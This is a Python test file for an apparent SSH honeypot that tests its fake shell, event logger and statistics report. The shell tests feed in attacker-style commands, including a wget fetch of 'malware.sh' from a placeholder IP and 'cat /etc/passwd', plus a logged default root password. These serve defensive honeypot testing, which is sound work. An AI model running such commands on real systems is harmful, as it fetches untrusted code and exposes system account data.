"""Tests for the parts that don't need a network connection or paramiko."""

import json
from pathlib import Path

from sshpot.cli import main
from sshpot.logger import EventLogger
from sshpot.shell import FakeShell
from sshpot.stats import load, report

SAMPLE = Path(__file__).resolve().parent.parent / "samples" / "sample.jsonl"


def test_fake_shell_basic_commands():
    sh = FakeShell("root")
    assert sh.handle("whoami") == ("root", False)
    assert "Linux" in sh.handle("uname -a")[0]
    assert "root:x:0:0" in sh.handle("cat /etc/passwd")[0]
    assert sh.handle("nmap")[0] == "-bash: nmap: command not found"
    assert sh.handle("exit")[1] is True


def test_fake_shell_chained_and_cd():
    sh = FakeShell("ubuntu")
    out, close = sh.handle("cd /tmp && pwd; whoami")
    assert out == "/tmp\r\nubuntu" and not close
    assert sh.prompt == "ubuntu@srv-prod-01:/tmp$ "


def test_wget_does_not_download():
    out, _ = FakeShell().handle("wget http://203.0.113.1/malware.sh")
    assert "unable to resolve" in out


def test_logger_writes_json_lines(tmp_path):
    log = tmp_path / "x.jsonl"
    EventLogger(str(log), echo=False).log("login_failed", "1.2.3.4", username="root", password="toor")
    record = json.loads(log.read_text())
    assert record["event"] == "login_failed" and record["password"] == "toor"


def test_stats_from_sample():
    s = load(str(SAMPLE))
    assert s.connections == 4 and len(s.unique_ips) == 3
    assert s.attempts == 9 and s.successes == 2
    assert s.combos.most_common(1)[0] == ("root:123456", 2)
    assert s.ips.most_common(1)[0][0] == "198.51.100.14"
    assert len(s.downloads) == 1
    text = report(s)
    assert "Top 10 passwords" in text and "Download attempts" in text


def test_cli_stats(capsys):
    assert main(["stats", str(SAMPLE), "--top", "3"]) == 0
    assert "Connections      : 4" in capsys.readouterr().out
